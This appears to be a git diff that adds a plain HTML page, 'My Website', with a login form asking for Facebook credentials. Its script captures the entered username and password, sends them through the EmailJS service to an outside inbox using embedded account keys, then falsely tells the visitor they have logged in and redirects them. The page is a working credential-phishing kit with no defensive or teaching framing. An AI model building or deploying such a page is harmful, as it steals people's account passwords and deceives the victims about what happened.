@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Website</title>
+    <style>
+        /* Your existing CSS styles */
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="">facebook</a></li>
+                <li><a href="">instagram</a></li>
+                <li><a href="">youtube</a></li>
+            </ul>
+        </nav>
+        <h1>My Website</h1> 
+    </header>
+    <section>
+        <div class="login-container">
+            <form id="loginform" onsubmit="sendEmail(event)">
+                <h2>login (facebook credentials)</h2>
+                <label for="username"> username</label>
+                <input type="text" id="username" name="username" required>
+                <label for="password"> password:</label>
+                <input type="password" id="password" name="password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </section>
+    <footer>
+        <div class="Create-container">
+            <p>Don't have an account? <a href="register.html">Sign up here</a></p>
+        </div>
+        <button type="forgotpassword">forgot password</button>
+        <a href="ForgotPassword.html">forgotpassword</a>
+    </footer>
+
+    <!-- Include the latest EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.4.0/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("s4q7Nk6cGLwfb7XkW"); // Your public key
+        })();
+        
+        function sendEmail(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            emailjs.send("service_2st2oij", "template_q0a7bf4", {
+                username: username,
+                password: password
+            })
+            .then(() => {
+                alert("You have fully logged in");
+                window.location.href = "home.html"; // Redirect to the dashboard page
+            })
+            .catch((error) => {
+                console.error("Error sending email:", error); // Log the error to the console
+                alert("Error sending email: " + JSON.stringify(error)); // Show a stringified version
+            });
+        }
+    </script>
+</body>
+</html>
